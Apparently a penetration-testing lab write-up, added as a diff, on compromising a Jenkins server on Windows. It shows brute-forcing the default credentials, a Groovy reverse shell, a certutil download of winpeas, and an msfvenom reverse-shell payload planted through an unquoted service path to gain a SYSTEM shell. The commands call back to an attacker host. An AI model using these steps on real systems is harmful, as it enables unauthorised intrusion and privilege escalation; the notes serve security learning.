@@ -1,0 +1,10 @@
+- 1 - Nmap and notice the port 8080 is open with Jenkis running. 
+- 2 - After researching exploits and alternatives to attack we would try to bruteforce. 
+- 3 - Using Burpsuit we can intercept a login request and send it to intruder. Using the Cluster bomb we can try using usernames and passwords. We could go online and research for the top 100 usernames and paswords for jenkins Or using rockyou.txt. 
+	- Results: jenkins:jenkins
+- 4 - Once in I can search online ways to attack the system. I can see that there is a "script console" using Groovy script. Searching for a reverse shell using groovy we get https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76. Set a nc listener on our machine and change the localhost to my ip. 
+- Once inside we can use winpeas to list potential vulnerabilities. Dowload the winpeas to my machine and move it to a new folder and run the "python3 -m http.server 80" and on the windows machine to get the file use "certutil.exe -urlcache -f http://192.168.138.132/winpeas.exe winpeas.exe" (first name is the name on my system and the second is how it will be named in the windows system). The use "dir" (this is the ls for windows)
+- We found something interesting in the services section:
+- ![[Pasted image 20230517165225.png]] This service is runnig and the file path has no quotes thats why "No quotes and space detected". This means the system will check every type of path by adding an .exe to check if that is the file to be used. This means we can go to the folder Wise and create a wise.exe that would give as a admin reverse shell.
+- We can use msfvenom on our system to create a exploit. using "msvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.138.132 LPORT=1234 -f exe > Wise.exe" and use the python server again to host this file. 
+- After getting the file we need to stop and start again the service using this file. In the picture is called WiseBootAssistant. To stop we use "sc stop WiseBootAssistant" to check the status "sc query WiseBootAssistant" and to start again using "sc start WiseBootAssistant" and we get a authority\system shell. Do not forget to create the nc listener again with the port 1234.
